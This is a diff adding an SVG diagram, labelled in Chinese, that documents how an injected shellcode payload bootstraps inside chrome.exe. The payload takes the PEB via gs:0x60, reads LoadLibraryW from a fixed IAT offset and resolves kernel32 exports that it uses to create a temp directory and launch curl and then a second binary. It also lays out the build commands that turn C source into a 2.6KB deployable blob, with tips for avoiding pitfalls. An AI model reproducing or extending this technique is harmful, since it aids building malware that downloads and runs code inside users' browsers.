@@ -1,0 +1,113 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="960" height="580" viewBox="0 0 960 580" font-family="'Segoe UI','Microsoft YaHei',sans-serif">
+  <defs>
+    <linearGradient id="bg" x1="0" y1="0" x2="0" y2="1">
+      <stop offset="0" stop-color="#fbfdff"/><stop offset="1" stop-color="#eef2f7"/>
+    </linearGradient>
+    <linearGradient id="accent" x1="0" y1="0" x2="1" y2="0">
+      <stop offset="0" stop-color="#2563eb"/><stop offset="1" stop-color="#059669"/>
+    </linearGradient>
+    <filter id="sh" x="-20%" y="-20%" width="140%" height="140%">
+      <feDropShadow dx="0" dy="1.5" stdDeviation="2.5" flood-color="#0f172a" flood-opacity="0.10"/>
+    </filter>
+    <marker id="ar" viewBox="0 0 10 10" refX="9" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse">
+      <path d="M0,0 L10,5 L0,10 z" fill="#64748b"/>
+    </marker>
+  </defs>
+  <rect width="960" height="580" fill="url(#bg)"/>
+  <text x="480" y="36" text-anchor="middle" font-size="20" font-weight="bold" fill="#0f172a">payload 自举：从 gs:0x60 到 5 个函数指针</text>
+  <rect x="380" y="46" width="200" height="3.5" rx="1.75" fill="url(#accent)"/>
+  <text x="480" y="66" text-anchor="middle" font-size="12" fill="#64748b">零常量 · 零遍历 · 零新 DLL —— 重启免疫</text>
+
+  <!-- 5-step pipeline -->
+  <g filter="url(#sh)">
+    <rect x="30" y="86" width="162" height="86" rx="8" fill="#ffffff" stroke="#2563eb"/>
+    <rect x="212" y="86" width="172" height="86" rx="8" fill="#ffffff" stroke="#2563eb"/>
+    <rect x="404" y="86" width="192" height="86" rx="8" fill="#ffffff" stroke="#4f46e5"/>
+    <rect x="616" y="86" width="152" height="86" rx="8" fill="#ffffff" stroke="#d97706"/>
+    <rect x="788" y="86" width="152" height="86" rx="8" fill="#ffffff" stroke="#059669"/>
+  </g>
+  <circle cx="50" cy="106" r="10" fill="#2563eb"/><text x="50" y="110" text-anchor="middle" font-size="11" font-weight="bold" fill="#fff">1</text>
+  <text x="111" y="111" text-anchor="middle" font-size="12" font-weight="bold" fill="#1e40af">取 PEB</text>
+  <text x="111" y="134" text-anchor="middle" font-size="11" fill="#2563eb" font-family="Consolas,monospace">mov rax, gs:[0x60]</text>
+  <text x="111" y="156" text-anchor="middle" font-size="10" fill="#64748b">进程块自带，无需搜索</text>
+
+  <circle cx="232" cy="106" r="10" fill="#2563eb"/><text x="232" y="110" text-anchor="middle" font-size="11" font-weight="bold" fill="#fff">2</text>
+  <text x="298" y="111" text-anchor="middle" font-size="12" font-weight="bold" fill="#1e40af">chrome.exe 基址</text>
+  <text x="298" y="134" text-anchor="middle" font-size="11" fill="#2563eb" font-family="Consolas,monospace">base = [peb+0x10]</text>
+  <text x="298" y="156" text-anchor="middle" font-size="10" fill="#64748b">ImageBase（加载器写好）</text>
+
+  <circle cx="424" cy="106" r="10" fill="#4f46e5"/><text x="424" y="110" text-anchor="middle" font-size="11" font-weight="bold" fill="#fff">3</text>
+  <text x="500" y="111" text-anchor="middle" font-size="12" font-weight="bold" fill="#3730a3">IAT 槽现成地址</text>
+  <text x="500" y="134" text-anchor="middle" font-size="11" fill="#4f46e5" font-family="Consolas,monospace">llw = [base+0x3BE4B8]</text>
+  <text x="500" y="156" text-anchor="middle" font-size="10" fill="#64748b">= kernel32!LoadLibraryW</text>
+
+  <circle cx="636" cy="106" r="10" fill="#d97706"/><text x="636" y="110" text-anchor="middle" font-size="11" font-weight="bold" fill="#fff">4</text>
+  <text x="692" y="111" text-anchor="middle" font-size="12" font-weight="bold" fill="#92400e">下扫 MZ+PE</text>
+  <text x="692" y="134" text-anchor="middle" font-size="11" fill="#b45309" font-family="Consolas,monospace">k32 = llw &amp; ~0xFFF</text>
+  <text x="692" y="156" text-anchor="middle" font-size="10" fill="#64748b">逐页向下找 5A4D+4550</text>
+
+  <circle cx="808" cy="106" r="10" fill="#059669"/><text x="808" y="110" text-anchor="middle" font-size="11" font-weight="bold" fill="#fff">5</text>
+  <text x="864" y="111" text-anchor="middle" font-size="12" font-weight="bold" fill="#065f46">解析导出表</text>
+  <text x="864" y="134" text-anchor="middle" font-size="11" fill="#059669" font-family="Consolas,monospace">names/ords/funcs</text>
+  <text x="864" y="156" text-anchor="middle" font-size="10" fill="#64748b">按名精确匹配（逐字节）</text>
+
+  <line x1="192" y1="129" x2="210" y2="129" stroke="#64748b" stroke-width="1.6" marker-end="url(#ar)"/>
+  <line x1="384" y1="129" x2="402" y2="129" stroke="#64748b" stroke-width="1.6" marker-end="url(#ar)"/>
+  <line x1="596" y1="129" x2="614" y2="129" stroke="#64748b" stroke-width="1.6" marker-end="url(#ar)"/>
+  <line x1="768" y1="129" x2="786" y2="129" stroke="#64748b" stroke-width="1.6" marker-end="url(#ar)"/>
+
+  <!-- resolved exports -->
+  <g filter="url(#sh)">
+    <rect x="30" y="196" width="600" height="158" rx="10" fill="#0f172a"/>
+  </g>
+  <circle cx="52" cy="218" r="4.5" fill="#f87171"/><circle cx="68" cy="218" r="4.5" fill="#fbbf24"/><circle cx="84" cy="218" r="4.5" fill="#34d399"/>
+  <text x="330" y="222" text-anchor="middle" font-size="12" font-weight="bold" fill="#e2e8f0">解析出的 5 个导出（expchk.c 实测：全部 REAL，无转发器）</text>
+  <g font-family="Consolas,monospace" font-size="12">
+    <text x="56" y="250" fill="#93c5fd">GetTempPathA        <tspan fill="#64748b">rva=00025170</tspan>  <tspan fill="#34d399">REAL</tspan>  <tspan fill="#94a3b8">→ %TEMP%</tspan></text>
+    <text x="56" y="272" fill="#93c5fd">CreateDirectoryA    <tspan fill="#64748b">rva=00024e60</tspan>  <tspan fill="#34d399">REAL</tspan>  <tspan fill="#94a3b8">→ msdb</tspan></text>
+    <text x="56" y="294" fill="#93c5fd">GetModuleFileNameA  <tspan fill="#64748b">rva=0001f4e0</tspan>  <tspan fill="#34d399">REAL</tspan>  <tspan fill="#94a3b8">→ chrome 自身路径</tspan></text>
+    <text x="56" y="316" fill="#93c5fd">CreateProcessA      <tspan fill="#64748b">rva=0001caa0</tspan>  <tspan fill="#34d399">REAL</tspan>  <tspan fill="#94a3b8">→ curl / ms64 两次</tspan></text>
+    <text x="56" y="338" fill="#fca5a5">WaitForSingleObject <tspan fill="#64748b">rva=00024e10</tspan>  <tspan fill="#34d399">REAL</tspan>  <tspan fill="#94a3b8">→ 等 curl 退出</tspan></text>
+  </g>
+
+  <!-- forwarder warning -->
+  <g filter="url(#sh)">
+    <rect x="656" y="196" width="284" height="158" rx="10" fill="#ffffff" stroke="#dc2626" stroke-width="1.5"/>
+    <rect x="656" y="196" width="5" height="158" rx="2.5" fill="#dc2626"/>
+  </g>
+  <text x="798" y="222" text-anchor="middle" font-size="12.5" font-weight="bold" fill="#991b1b">⚠ 为什么必须查转发器</text>
+  <g font-size="10.5" fill="#b91c1c" text-anchor="middle">
+    <text x="798" y="245">kernel32 部分导出是指向 kernelbase 的</text>
+    <text x="798" y="262">FORWARDER（RVA 落在导出目录内，</text>
+    <text x="798" y="279">内容是 "kernelbase.Xxx" 字符串）</text>
+    <text x="798" y="301">按名取到转发器并调用 → 跳进字符串区</text>
+    <text x="798" y="318">当指令执行 = 立即崩溃</text>
+  </g>
+  <rect x="686" y="328" width="224" height="18" rx="9" fill="#fee2e2"/>
+  <text x="798" y="341" text-anchor="middle" font-size="9.5" font-weight="bold" fill="#991b1b">expchk.c 逐个验证后才进 g_names 表</text>
+
+  <!-- build pipeline -->
+  <g filter="url(#sh)">
+    <rect x="30" y="380" width="910" height="178" rx="10" fill="#ffffff" stroke="#e2e8f0"/>
+  </g>
+  <text x="480" y="406" text-anchor="middle" font-size="13.5" font-weight="bold" fill="#0f172a">从 C 源到 2.6KB 可部署 blob 的构建流水线</text>
+  <rect x="48" y="418" width="560" height="126" rx="8" fill="#0f172a"/>
+  <g font-size="11.5" font-family="Consolas,monospace" fill="#a5f3fc">
+    <text x="64" y="442"><tspan fill="#64748b">$</tspan> clang -Oz -ffreestanding -fno-stack-protector -c payload_src_w4.c</text>
+    <text x="64" y="464"><tspan fill="#64748b">$</tspan> llvm-objdump -d | grep -c "e8 00 00 00 00"  <tspan fill="#64748b"># 必须 = 0</tspan></text>
+    <text x="64" y="486"><tspan fill="#64748b">$</tspan> llvm-readobj --sections → RawData=0xDC, Size=0xA39</text>
+    <text x="64" y="508"><tspan fill="#64748b">$</tspan> dd if=payload_w4.o of=payload_w4.bin bs=1 skip=220 count=2617</text>
+    <text x="64" y="530"><tspan fill="#64748b">$</tspan> llvm-nm → payload_main=0x9E, g_origin=0x950 <tspan fill="#64748b">→ 烘焙进 embed</tspan></text>
+  </g>
+  <g font-size="10.5">
+    <rect x="624" y="422" width="302" height="36" rx="6" fill="#fef2f2"/>
+    <text x="636" y="437" font-weight="bold" fill="#991b1b">✗ 坑A：跨函数 call 的 rel32 是占位 0</text>
+    <text x="636" y="452" fill="#b91c1c">→ 辅助函数必须 always_inline</text>
+    <rect x="624" y="464" width="302" height="36" rx="6" fill="#fef2f2"/>
+    <text x="636" y="479" font-weight="bold" fill="#991b1b">✗ 坑B：objcopy 会塞 60 字节 COFF 节表头</text>
+    <text x="636" y="494" fill="#b91c1c">→ 偏移整体漂移，必须 dd 精抽</text>
+    <rect x="624" y="506" width="302" height="36" rx="6" fill="#fef2f2"/>
+    <text x="636" y="521" font-weight="bold" fill="#991b1b">✗ 坑C：.rodata 字面量部署即丢失</text>
+    <text x="636" y="536" fill="#b91c1c">→ 字符串全部显式 section(".text")</text>
+  </g>
+</svg>
